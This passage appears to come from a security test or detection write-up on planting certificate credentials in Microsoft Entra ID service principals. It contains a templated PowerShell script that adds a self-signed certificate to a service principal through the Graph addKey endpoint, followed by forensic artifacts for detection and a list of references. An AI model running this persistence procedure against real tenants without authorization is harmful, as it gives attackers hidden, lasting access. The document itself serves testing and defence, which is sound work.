      Install-Module Microsoft.Graph -Force
      Connect-MgGraph -Scopes "Application.ReadWrite.All"
      
      $Cert = New-SelfSignedCertificate -CertStoreLocation "Cert:\CurrentUser\My" -Subject "CN=AtomicTest" -KeySpec KeyExchange -NotAfter (Get-Date).AddDays({{ cert_validity_days }})
      Export-Certificate -Cert $Cert -FilePath "C:\Temp\atomic_cert.cer"
      
      $CertData = [System.IO.File]::ReadAllBytes("C:\Temp\atomic_cert.cer")
      $CertB64 = [System.Convert]::ToBase64String($CertData)
      
      $KeyCredential = @{
        displayName = "AtomicTest-$(Get-Random)"
        type = "AsymmetricX509Cert"
        usage = "Sign"
        key = $CertB64
      }
      
      Invoke-MgGraphRequest -Method POST -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/{{ sp_client_id }}/addKey" -Body @{ keyCredential = $KeyCredential }
```

---

## 12. FORENSIC ARTIFACTS

**Cloud Artifacts:**
- **Location:** Microsoft Entra audit logs (`AuditLogs` table in Sentinel)
- **Evidence:** OperationName = "Add service principal credentials"; targetResources contains service principal ID
- **Retention:** Default 30 days (configurable up to 90 days or longer with premium logging)

**File Artifacts (if keys stored locally):**
- **Location:** `C:\Users\<username>\AppData\Roaming\Microsoft\Crypto\RSA` (Windows) or `~/.config/` (Linux)
- **Location:** Certificate store: `Cert:\CurrentUser\My` (PowerShell)

**Network Artifacts:**
- **Destination:** Graph API endpoints (`graph.microsoft.com/v1.0/servicePrincipals/*/addKey`)
- **Port:** HTTPS (443)
- **Logs:** Azure API logs, firewall logs if Graph API is restricted

**Memory Artifacts:**
- Certificates and private keys may remain in process memory if PowerShell or Azure CLI sessions are not properly terminated

---

**References:**
- [Microsoft Entra ID Service Principal Documentation](https://learn.microsoft.com/en-us/entra/identity-platform/app-objects-and-service-principals)
- [Adding Key Credentials to Service Principals - Microsoft Graph API](https://learn.microsoft.com/en-us/graph/api/serviceprincipal-addkey)
- [SpecterOps - Abusing Azure AD Application Permissions](https://posts.specterops.io/)
- [Semperis - Persisting Unseen: Defending Against Entra ID Persistence](https://kknowl.es/posts/defending-against-entra-id-persistence/)
- [Red Canary - Azure Threat Research](https://redcanary.com/threat-detection/)

---